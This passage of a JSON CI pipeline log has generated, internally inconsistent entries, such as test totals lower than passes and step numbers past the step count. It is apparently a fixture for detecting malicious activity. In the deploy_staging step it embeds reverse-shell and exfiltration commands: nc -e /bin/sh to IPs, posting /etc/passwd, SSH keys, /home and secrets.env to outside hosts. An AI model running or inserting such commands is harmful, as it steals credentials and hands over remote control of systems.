          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 79 tests in 13s",
          "Cache invalidated: dependencies",
          "Checking out master branch",
          "Step 10/15: Installing dependencies",
          "Step 19/25: Installing dependencies",
          "Ran 128 tests in 51s",
          "NODE_ENV=development",
          "[12:18:44] INFO: Connecting to database",
          "Connecting to startup.dev:443...",
          "Bundling vendor.js",
          "Cache saved successfully",
          "Bundling runtime.css",
          "Bundling main.js",
          "[12:18:44] WARN: Deprecated API usage",
          "Step 6/23: Running migrations",
          "[12:18:44] WARN: Deprecated API usage",
          "\u2713 package completed",
          "Step 15/18: Deploying",
          "Compiling src/utils.go...",
          "\u2713 Step 'setup' succeeded",
          "Step 10/24: Linting",
          "Using Python 3.12",
          "yarn add: Done in 17.87s",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 36MB",
          "Tests: 61 passed, 183 total",
          "Pushing to registry...",
          "npm install: resolved 1788 packages",
          "Connecting to test.io:443...",
          "Step 4/24: Installing dependencies",
          "Using Python 3.9",
          "Platform: linux-x64",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-29T12:19:07.417989",
        "finished_at": "2025-11-29T12:19:12.036689",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: build.tar.gz (39MB)",
          "npm notice: created a lockfile",
          "Using Python 3.9",
          "Generating source maps...",
          "Ran 34 tests in 33s",
          "[12:18:44] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Layer 6/12: ENV command",
          "Transforming 397 files...",
          "pip: Downloading eslint-1.4.tar.gz",
          "Optimizing 75 modules...",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "Checking out develop branch",
          "Cache saved successfully",
          "NODE_ENV=production",
          "Connecting to cloud.services:443...",
          "Connecting to acme.corp:443...",
          "Ready.",
          "Compiling utils/main.py...",
          "Finished.",
          "Tests: 116 passed, 473 total",
          "[12:18:44] DEBUG: Connection pool: 7 active",
          "Bundling styles.js",
          "Pushing to registry...",
          "  PASS: test_cache_hit (478ms)",
          "[12:18:44] DEBUG: Query executed in 18ms",
          "Test Suites: 21 passed, 42 total",
          "Step 2/24: Deploying",
          "pip install: Successfully installed eslint-1.16",
          "Using Node.js 18.2.10",
          "npm notice: package.json updated",
          "Done.",
          "Using Python 3.11",
          "[12:18:44] DEBUG: Connection pool: 17 active",
          "Success!",
          "\u2717 build failed with exit code 7",
          "pip: Downloading prettier-4.3.tar.gz",
          "Minifying vendor.js",
          "Environment: production",
          "Cache hit for key-5003",
          "[12:18:44] DEBUG: Memory usage: 1657MB",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: dist.zip (32MB)",
          "Compiling src/handler.rs...",
          "Layer 4/11: COPY command",
          "Loading...",
          "[12:18:44] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 91",
          "Loading...",
          "Completed.",
          "Step 13/15: Installing dependencies",
          "Building Docker image...",
          "Connection established",
          "npm install: resolved 1727 packages",
          "Pulling image: alpine:18",
          "Ran 65 tests in 59s",
          "Finished.",
          "Minifying app.js",
          "Compiling src/handler.rs...",
          "pip install: Successfully installed webpack-1.10",
          "[12:18:44] DEBUG: Initializing service",
          "Finished.",
          "[12:18:44] INFO: Connecting to database",
          "Fetching submodules...",
          "Step 1/21: Testing",
          "\u2713 Step 'setup' succeeded",
          "Ready.",
          "npm install: resolved 152 packages",
          "Image pulled successfully",
          "Step 8/20: Linting",
          "Artifact uploaded: build.tar.gz (46MB)",
          "OK",
          "Coverage: 75% statements, 84% branches",
          "Ready.",
          "POST /api - 201 (343ms)",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-29T12:19:12.036689",
        "finished_at": "2025-11-29T12:19:16.655389",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:18:44] DEBUG: Loading configuration",
          "Generating source maps...",
          "Ran 155 tests in 40s",
          "\u2713 Task completed in 1585ms",
          "Bundling vendor.css",
          "Generating source maps...",
          "\u2713 lint completed",
          "Artifact downloaded: 34MB",
          "Artifact downloaded: 5MB",
          "Time: 33.794s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Bundling runtime.css",
          "pip install: Successfully installed axios-3.7",
          "[12:18:44] DEBUG: Connection pool: 16 active",
          "pip: Installing build dependencies...",
          "Uploading artifact 'dist' (42 files)",
          "[12:18:44] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_auth_login (494ms)",
          "Pulling image: python:18",
          "yarn add: Done in 2.33s",
          "[12:18:44] DEBUG: Query executed in 76ms",
          "pip: Collecting eslint",
          "POST /data - 202 (287ms)",
          "pip install: Successfully installed axios-4.1",
          "\u2713 Step 'install' succeeded",
          "Cache restored successfully (61MB)",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "Bundling runtime.css",
          "Cache invalidated: build",
          "Compiling src/service.java...",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Task completed in 2532ms",
          "Tests: 396 passed, 234 total",
          "\u2717 build failed with exit code 92",
          "npm install: resolved 171 packages",
          "Step 2/19: Deploying",
          "Waiting...",
          "Already up to date.",
          "pip install: Successfully installed react-2.15",
          "Ready.",
          "pip install: Successfully installed prettier-4.17",
          "Artifact uploaded: dist.zip (99MB)",
          "[12:18:44] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "[12:18:44] INFO: Connecting to database",
          "[12:18:44] INFO: Connecting to database",
          "npm install: added 471 packages",
          "[12:18:44] DEBUG: Initializing service",
          "Success!",
          "[12:18:44] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 791 packages",
          "Time: 38.401s",
          "[12:18:44] INFO: Processing request",
          "Step 15/16: Installing dependencies",
          "Compiling utils/service.java...",
          "pip: Collecting jest",
          "Verifying...",
          "Pulling image: alpine:3.11",
          "Finished.",
          "Step 18/25: Testing",
          "\u2713 Step 'build' succeeded",
          "Generating source maps...",
          "Pulling image: python:18",
          "\u2717 build failed with exit code 30",
          "Platform: win32-x64",
          "  PASS: unit/test_user_create.spec.js",
          "\u2713 lint completed",
          "npm install: added 38 packages",
          "Connection established",
          "[12:18:44] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-29T12:19:16.655389",
        "finished_at": "2025-11-29T12:19:28.202138",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 6/18: Building",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (11MB)",
          "HEAD is now at 0be8ccb",
          "Cache miss for key-4004",
          "Compiling lib/utils.go...",
          "[12:18:44] INFO: Cache refreshed",
          "Environment: development",
          "Using Node.js 14.18.8",
          "Switched to branch 'feature/task-194'",
          "Pushing to registry...",
          "pip: Collecting eslint",
          "yarn add: Done in 24.75s",
          "[12:18:44] INFO: Processing request",
          "npm install: added 422 packages",
          "  PASS: unit/test_user_create.spec.js",
          "[12:18:44] INFO: Processing request",
          "[12:18:44] DEBUG: Initializing service",
          "Pushing to registry...",
          "yarn add: Done in 5.51s",
          "npm notice: created a lockfile",
          "[12:18:44] INFO: Connecting to database",
          "  PASS: integration/test_cache_hit.spec.js",
          "Tests: 480 passed, 145 total",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "[12:18:44] INFO: Processing request",
          "Test Suites: 46 passed, 15 total",
          "pip install: Successfully installed eslint-2.4",
          "Transforming 501 files...",
          "pip: Collecting jest",
          "[12:18:44] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Uploading artifact 'dist' (26 files)",
          "Step 18/16: Deploying",
          "Building Docker image...",
          "Connecting to startup.dev:443...",
          "HEAD is now at d58c6fa",
          "pip: Collecting webpack",
          "Pushing to registry...",
          "Connection established",
          "Step 6/15: Running migrations",
          "  PASS: e2e/test_db_connect.spec.js",
          "Completed.",
          "[12:18:44] INFO: Connecting to database",
          "Platform: darwin-arm64",
          "NODE_ENV=development",
          "Step 19/19: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_api_health (78ms)",
          "Fetching submodules...",
          "Environment: development",
          "Uploading artifact 'coverage' (49 files)",
          "npm install: resolved 1902 packages",
          "pip: Downloading jest-1.12.tar.gz",
          "Cache saved successfully",
          "[12:18:44] INFO: Request completed",
          "Bundling main.js",
          "Processing...",
          "Ran 169 tests in 39s",
          "Switched to branch 'hotfix/task-688'",
          "[12:18:44] INFO: Processing request",
          "\u2713 Step 'build' succeeded",
          "GET /status - 200 (100ms)",
          "Minifying app.js",
          "GET /status - 204 (41ms)",
          "Step 18/22: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 8/21: Running migrations",
          "Installing eslint@4.8.0",
          "[12:18:44] WARN: Deprecated API usage",
          "Already up to date.",
          "Exception: TypeError",
          "Uploading artifact 'coverage' (35 files)",
          "Building Docker image...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-29T12:19:28.202138",
        "finished_at": "2025-11-29T12:19:39.748887",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 13/17: Installing dependencies",
          "Test Suites: 27 passed, 47 total",
          "Installing eslint@5.2.8",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Transforming 894 files...",
          "Done.",
          "Finished.",
          "pip: Installing build dependencies...",
          "GET /status - 201 (72ms)",
          "Coverage: 95% statements, 78% branches",
          "GET /status - 204 (60ms)",
          "Snapshots: 26 passed, 5 total",
          "FAILED: test_user_create",
          "[12:18:44] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (48 files)",
          "Test Suites: 36 passed, 40 total",
          "Using Node.js 18.17.5",
          "Time: 73.790s",
          "Step 12/21: Linting",
          "Compiling components/main.py...",
          "Completed.",
          "Loading...",
          "\u2713 package completed",
          "Switched to branch 'bugfix/task-214'",
          "[12:18:44] INFO: Request completed",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "Switched to branch 'hotfix/task-878'",
          "TLS handshake completed",
          "Success!",
          "npm install: resolved 809 packages",
          "Step 20/15: Running migrations",
          "npm install: added 392 packages",
          "Test Suites: 49 passed, 49 total",
          "pip: Downloading webpack-3.9.tar.gz",
          "Tests: 316 passed, 424 total",
          "NODE_ENV=production",
          "GET /status - 201 (95ms)",
          "Already up to date.",
          "Generating source maps...",
          "\u2713 package completed",
          "[12:18:44] INFO: Starting build process",
          "FAILED: test_api_health",
          "Snapshots: 38 passed, 6 total",
          "Cache miss for key-4838",
          "Artifact uploaded: build.tar.gz (45MB)",
          "yarn add: Done in 3.43s",
          "npm install: resolved 618 packages",
          "Compiling src/handler.rs...",
          "pip install: Successfully installed react-1.12",
          "Cache hit for key-9277",
          "[12:18:44] DEBUG: Query executed in 89ms",
          "Pushing to registry...",
          "Ran 13 tests in 49s",
          "npm install: added 60 packages",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/service.java...",
          "Environment: production",
          "Creating production build...",
          "TLS handshake completed",
          "\u2717 build failed with exit code 111",
          "Image pulled successfully",
          "Image pulled successfully",
          "Waiting...",
          "Step 8/15: Linting",
          "Pulling image: alpine:3.11",
          "[12:18:44] DEBUG: Initializing service",
          "[12:18:44] INFO: Cache refreshed",
          "Environment: staging",
          "Snapshots: 16 passed, 12 total",
          "Installing webpack@2.9.8",
          "Using Python 3.10",
          "Using Python 3.10",
          "npm install: resolved 652 packages",
          "Verifying...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-29T12:19:39.748887",
        "finished_at": "2025-11-29T12:19:46.676936",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Artifact downloaded: 2MB",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Using Node.js 14.3.10",
          "Waiting...",
          "Creating production build...",
          "Cache hit for key-3294",
          "Checking out master branch",
          "Test Suites: 6 passed, 45 total",
          "Done.",
          "Environment: test",
          "Cache hit for key-4627",
          "Minifying vendor.js",
          "Layer 3/14: COPY command",
          "Checking out master branch",
          "FAILED: test_cache_hit",
          "Step 13/17: Building",
          "WARNING: axios has known vulnerabilities",
          "Optimizing 80 modules...",
          "NODE_ENV=test",
          "\u2713 Step 'test' succeeded",
          "OK",
          "pip: Installing build dependencies...",
          "FAILED: test_user_create",
          "Cache invalidated: dependencies",
          "Generating source maps...",
          "Optimizing 28 modules...",
          "Compiling utils/handler.rs...",
          "Creating production build...",
          "[12:18:44] DEBUG: Memory usage: 1737MB",
          "Compiling components/service.java...",
          "Compiling lib/service.java...",
          "Environment: test",
          "[12:18:44] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "[12:18:44] INFO: Starting build process",
          "Connecting to example.com:443...",
          "Uploading artifact 'build' (6 files)",
          "[12:18:44] DEBUG: Memory usage: 1883MB",
          "pip: Collecting axios",
          "Checking out master branch",
          "Building Docker image...",
          "Fetching submodules...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed eslint-4.13",
          "FAILED: test_cache_hit",
          "Step 11/17: Running migrations",
          "npm notice: created a lockfile",
          "HEAD is now at bc4add3",
          "HEAD is now at 3e3566b",
          "NODE_ENV=test",
          "Done.",
          "Cache restored successfully (83MB)",
          "Step 15/25: Deploying",
          "OK",
          "Building Docker image...",
          "Tests: 141 passed, 383 total",
          "Ready.",
          "Fetching submodules...",
          "[12:18:44] DEBUG: Query executed in 70ms",
          "\u2717 build failed with exit code 98",
          "Switched to branch 'hotfix/task-764'",
          "Bundling runtime.js",
          "npm notice: created a lockfile",
          "[12:18:44] INFO: Connecting to database",
          "\u2713 test completed",
          "\u2713 All checks passed",
          "Test Suites: 28 passed, 43 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 283 packages",
          "[12:18:44] WARN: Deprecated API usage",
          "Step 8/20: Testing",
          "Coverage: 81% statements, 64% branches",
          "POST /upload - 200 (331ms)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-29T12:19:46.676936",
        "finished_at": "2025-11-29T12:20:21.317183",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:44] DEBUG: Initializing service",
          "Optimizing 76 modules...",
          "[12:18:44] INFO: Starting build process",
          "\u2713 All checks passed",
          "[12:18:44] INFO: Connecting to database",
          "POST /data - 200 (275ms)",
          "HEAD is now at 53eeb49",
          "Transforming 795 files...",
          "Step 18/23: Testing",
          "Time: 99.292s",
          "Switched to branch 'hotfix/task-563'",
          "pip install: Successfully installed prettier-3.14",
          "pip: Collecting react",
          "HEAD is now at 48cc994",
          "Compiling utils/main.py...",
          "[12:18:44] WARN: Deprecated API usage",
          "pip: Downloading react-5.5.tar.gz",
          "[12:18:44] INFO: Request completed",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "[12:18:44] WARN: Deprecated API usage",
          "Artifact downloaded: 39MB",
          "\u2713 package completed",
          "Compiling utils/app.ts...",
          "Layer 10/11: COPY command",
          "[12:18:44] INFO: Cache refreshed",
          "Step 12/16: Installing dependencies",
          "Environment: development",
          "Ran 65 tests in 58s",
          "[12:18:44] INFO: Connecting to database",
          "Snapshots: 35 passed, 36 total",
          "Cache hit for key-4590",
          "\u2713 All checks passed",
          "\u2713 Step 'install' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:44] DEBUG: Query executed in 30ms",
          "Optimizing 33 modules...",
          "GET /health - 201 (34ms)",
          "\u2713 lint completed",
          "[12:18:44] WARN: Deprecated API usage",
          "\u2713 Step 'test' succeeded",
          "Compiling lib/service.java...",
          "Success!",
          "Step 11/17: Testing",
          "Connecting to example.com:443...",
          "TLS handshake completed",
          "Compiling utils/service.java...",
          "Verifying...",
          "[12:18:44] DEBUG: Memory usage: 462MB",
          "Transforming 292 files...",
          "Compiling lib/index.js...",
          "[12:18:44] WARN: Deprecated API usage",
          "Loading...",
          "Coverage: 94% statements, 78% branches",
          "WARNING: express has known vulnerabilities",
          "Step 7/24: Deploying",
          "npm install: added 266 packages",
          "\u2713 Step 'install' succeeded",
          "[12:18:44] INFO: Request completed",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:44] DEBUG: Memory usage: 905MB",
          "[12:18:44] INFO: Processing request",
          "[12:18:44] INFO: Connecting to database",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:44] DEBUG: Initializing service",
          "[12:18:44] INFO: Cache refreshed",
          "[12:18:44] INFO: Processing request",
          "[12:18:44] DEBUG: Query executed in 57ms",
          "Step 16/20: Linting",
          "pip: Collecting webpack",
          "[12:18:44] DEBUG: Initializing service",
          "Ran 160 tests in 12s",
          "Pulling image: node:18",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-29T12:20:21.317183",
        "finished_at": "2025-11-29T12:20:55.957430",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:18:44] WARN: Deprecated API usage",
          "POST /data - 202 (252ms)",
          "[12:18:44] INFO: Request completed",
          "Exception: NullPointerException",
          "[12:18:44] DEBUG: Initializing service",
          "Cache restored successfully (247MB)",
          "Step 6/21: Running migrations",
          "Connecting to startup.dev:443...",
          "Uploading artifact 'coverage' (37 files)",
          "Step 15/17: Installing dependencies",
          "pip: Downloading eslint-1.14.tar.gz",
          "  PASS: test_auth_login (275ms)",
          "\u2713 All checks passed",
          "Processing...",
          "Using Python 3.11",
          "OK",
          "Step 4/17: Building",
          "Cache hit for key-8699",
          "Fetching submodules...",
          "  PASS: test_auth_login (254ms)",
          "[12:18:44] DEBUG: Memory usage: 135MB",
          "[12:18:44] WARN: Deprecated API usage",
          "Step 9/21: Linting",
          "npm install: added 470 packages",
          "Compiling components/utils.go...",
          "Verifying...",
          "Step 14/23: Running migrations",
          "pip: Collecting axios",
          "Using Node.js 20.12.8",
          "Cache miss for key-5594",
          "[12:18:44] DEBUG: Memory usage: 1270MB",
          "yarn add: Done in 14.71s",
          "pip: Downloading lodash-2.17.tar.gz",
          "Connecting to example.com:443...",
          "Tests: 189 passed, 291 total",
          "Building Docker image...",
          "Compiling lib/app.ts...",
          "\u2713 test completed",
          "Step 16/23: Deploying",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/main.py...",
          "npm notice: package.json updated",
          "Success!",
          "Bundling main.css",
          "Time: 25.210s",
          "OK",
          "NODE_ENV=development",
          "Bundling vendor.css",
          "Success!",
          "Verifying...",
          "Creating production build...",
          "Minifying main.js",
          "Connecting to cloud.services:443...",
          "[12:18:44] DEBUG: Loading configuration",
          "WARNING: lodash has known vulnerabilities",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Processing...",
          "[12:18:44] DEBUG: Initializing service",
          "Ready.",
          "Fetching submodules...",
          "Switched to branch 'bugfix/task-213'",
          "Image pulled successfully",
          "FAILED: test_auth_login",
          "Bundling runtime.js",
          "Step 10/19: Deploying",
          "Cache invalidated: node_modules",
          "Tests: 477 passed, 208 total",
          "Success!",
          "Step 20/24: Testing",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-503'",
          "Processing...",
          "[12:18:44] DEBUG: Initializing service",
          "Artifact downloaded: 47MB",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-29T12:20:55.957430",
        "finished_at": "2025-11-29T12:21:07.504179",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Processing...",
          "[12:18:44] INFO: Cache refreshed",
          "Ready.",
          "[12:18:44] INFO: Request completed",
          "Uploading artifact 'build' (8 files)",
          "WARNING: jest has known vulnerabilities",
          "Step 4/18: Linting",
          "Tests: 127 passed, 104 total",
          "Snapshots: 8 passed, 26 total",
          "Ran 135 tests in 25s",
          "Finished.",
          "[12:18:44] DEBUG: Connection pool: 3 active",
          "[12:18:44] INFO: Starting build process",
          "Snapshots: 8 passed, 50 total",
          "Connecting to test.io:443...",
          "Step 4/22: Testing",
          "Connecting to startup.dev:443...",
          "Ran 30 tests in 53s",
          "Compiling src/main.py...",
          "Cache miss for key-1472",
          "Time: 111.373s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 266 passed, 404 total",
          "\u2713 Step 'install' succeeded",
          "Cache invalidated: dependencies",
          "Compiling src/handler.rs...",
          "Artifact downloaded: 9MB",
          "Pulling image: python:latest",
          "npm install: added 353 packages",
          "Step 2/20: Deploying",
          "Layer 10/10: RUN command",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 deploy completed",
          "[12:18:44] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@5.1.9",
          "pip install: Successfully installed eslint-3.2",
          "Connecting to test.io:443...",
          "Building Docker image...",
          "Completed.",
          "Exception: RuntimeError",
          "Loading...",
          "Cache hit for key-9747",
          "Cache miss for key-9483",
          "Waiting...",
          "Compiling src/app.ts...",
          "[12:18:44] DEBUG: Connection pool: 8 active",
          "pip: Collecting react",
          "Switched to branch 'feature/task-377'",
          "[12:18:44] DEBUG: Initializing service",
          "WARNING: express has known vulnerabilities",
          "[12:18:44] INFO: Connecting to database",
          "FAILED: test_api_health",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 8/15: Linting",
          "Using Node.js 15.14.4",
          "Verifying...",
          "npm install: resolved 897 packages",
          "Tests: 148 passed, 280 total",
          "Cache hit for key-8328",
          "\u2713 Task completed in 4999ms",
          "Generating source maps...",
          "[12:18:44] INFO: Starting build process",
          "Cache hit for key-4835",
          "Cache invalidated: build",
          "Minifying vendor.js",
          "Time: 26.309s",
          "npm install: resolved 1107 packages",
          "Compiling lib/main.py...",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 2/23: Building",
          "Connection established",
          "[12:18:44] WARN: Deprecated API usage",
          "Pulling image: python:18",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-29T12:21:07.504179",
        "finished_at": "2025-11-29T12:21:14.432228",
        "log_lines": [
          "=== Step: save_cache ===",
          "npm install: added 277 packages",
          "Artifact downloaded: 49MB",
          "POST /upload - 200 (377ms)",
          "npm notice: created a lockfile",
          "Cache miss for key-7617",
          "Compiling utils/utils.go...",
          "Pulling image: python:latest",
          "Step 18/18: Building",
          "Ready.",
          "Test Suites: 21 passed, 19 total",
          "OK",
          "[12:18:44] INFO: Cache refreshed",
          "Using Python 3.9",
          "[12:18:44] DEBUG: Loading configuration",
          "Installing lodash@3.13.9",
          "NODE_ENV=production",
          "[12:18:44] DEBUG: Memory usage: 829MB",
          "Tests: 292 passed, 462 total",
          "Compiling src/main.py...",
          "Cache hit for key-5348",
          "[12:18:44] INFO: Cache refreshed",
          "Step 1/16: Running migrations",
          "GET /status - 200 (86ms)",
          "Bundling vendor.css",
          "Artifact downloaded: 22MB",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "POST /upload - 202 (57ms)",
          "Step 5/23: Installing dependencies",
          "Uploading artifact 'coverage' (41 files)",
          "[12:18:44] INFO: Connecting to database",
          "[12:18:44] DEBUG: Loading configuration",
          "Time: 44.112s",
          "Step 7/22: Testing",
          "Compiling utils/handler.rs...",
          "[12:18:44] DEBUG: Memory usage: 1258MB",
          "Cache invalidated: node_modules",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "pip: Collecting express",
          "pip: Collecting eslint",
          "Building Docker image...",
          "Step 14/21: Linting",
          "Cache invalidated: dependencies",
          "Layer 1/15: RUN command",
          "Time: 55.415s",
          "Done.",
          "\u2713 Task completed in 2077ms",
          "Waiting...",
          "FAILED: test_cache_hit",
          "POST /data - 201 (96ms)",
          "Step 9/19: Installing dependencies",
          "pip install: Successfully installed eslint-3.15",
          "Tests: 467 passed, 207 total",
          "[12:18:44] INFO: Request completed",
          "[12:18:44] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Using Node.js 14.7.1",
          "yarn add: Done in 22.1s",
          "[12:18:44] INFO: Processing request",
          "Step 10/24: Linting",
          "yarn add: Done in 5.45s",
          "Installing jest@3.15.0",
          "Done.",
          "\u2713 All checks passed",
          "Platform: darwin-arm64",
          "pip: Downloading prettier-3.10.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache saved successfully",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 87 modules...",
          "Completed.",
          "\u2717 build failed with exit code 56",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-29T12:21:14.432228",
        "finished_at": "2025-11-29T12:21:49.072475",
        "log_lines": [
          "=== Step: build ===",
          "Image pulled successfully",
          "Platform: darwin-arm64",
          "Connecting to cloud.services:443...",
          "[12:18:44] INFO: Processing request",
          "Transforming 177 files...",
          "Step 14/15: Building",
          "[12:18:44] WARN: Deprecated API usage",
          "Step 4/18: Installing dependencies",
          "Step 12/25: Deploying",
          "pip: Installing build dependencies...",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Uploading artifact 'coverage' (37 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "Finished.",
          "NODE_ENV=test",
          "[12:18:44] INFO: Processing request",
          "TLS handshake completed",
          "Platform: linux-x64",
          "Connecting to cloud.services:443...",
          "[12:18:44] WARN: Deprecated API usage",
          "[12:18:44] INFO: Connecting to database",
          "Compiling lib/main.py...",
          "[12:18:44] INFO: Cache refreshed",
          "Processing...",
          "Transforming 872 files...",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (11MB)",
          "yarn add: Done in 10.68s",
          "Waiting...",
          "Optimizing 17 modules...",
          "Uploading artifact 'build' (4 files)",
          "Cache hit for key-5701",
          "Cache miss for key-1833",
          "[12:18:44] DEBUG: Loading configuration",
          "[12:18:44] DEBUG: Initializing service",
          "Completed.",
          "Step 17/16: Building",
          "\u2713 validate completed",
          "Compiling lib/service.java...",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "Artifact downloaded: 47MB",
          "[12:18:44] WARN: Deprecated API usage",
          "\u2713 Task completed in 2378ms",
          "Using Node.js 15.13.2",
          "Using Node.js 18.0.4",
          "npm notice: package.json updated",
          "Coverage: 75% statements, 99% branches",
          "Cache restored successfully (51MB)",
          "Using Python 3.9",
          "Layer 5/12: COPY command",
          "Finished.",
          "Checking out master branch",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "[12:18:44] INFO: Connecting to database",
          "WARNING: eslint has known vulnerabilities",
          "TLS handshake completed",
          "Pushing to registry...",
          "[12:18:44] WARN: Deprecated API usage",
          "HEAD is now at 2d57719",
          "Using Python 3.11",
          "Pulling image: python:latest",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "  PASS: integration/test_db_connect.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Compiling lib/utils.go...",
          "Step 14/25: Installing dependencies",
          "Compiling components/service.java...",
          "Image pulled successfully",
          "pip: Downloading lodash-2.8.tar.gz",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-29T12:21:49.072475",
        "finished_at": "2025-11-29T12:22:00.619224",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:18:44] INFO: Starting build process",
          "[12:18:44] INFO: Processing request",
          "[12:18:44] INFO: Processing request",
          "nc -e /bin/sh 162.88.139.114 55600",
          "HEAD is now at eadeb74",
          "Loading...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Using Python 3.11",
          "Tests: 271 passed, 317 total",
          "Checking out main branch",
          "GET /api - 201 (97ms)",
          "FAILED: test_user_create",
          "Step 18/17: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 169.249.77.151 25644",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 89.180.101.186 16636",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:18:44] DEBUG: Connection pool: 1 active",
          "pip: Downloading eslint-4.9.tar.gz",
          "Fetching submodules...",
          "FAILED: test_db_connect",
          "Uploading artifact 'dist' (15 files)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Bundling vendor.css",
          "Sending 160MB of data to startup.dev",
          "Ran 125 tests in 10s",
          "Environment: production",
          "Already up to date.",
          "nc -e /bin/sh 88.130.105.71 50732",
          "Fetching submodules...",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing jest@5.19.3",
          "Finished.",
          "Processing...",
          "npm install: resolved 681 packages",
          "Sending 474MB of data to example.com",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Compiling lib/service.java...",
          "\u2713 deploy completed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Ready.",
          "Checking out develop branch",
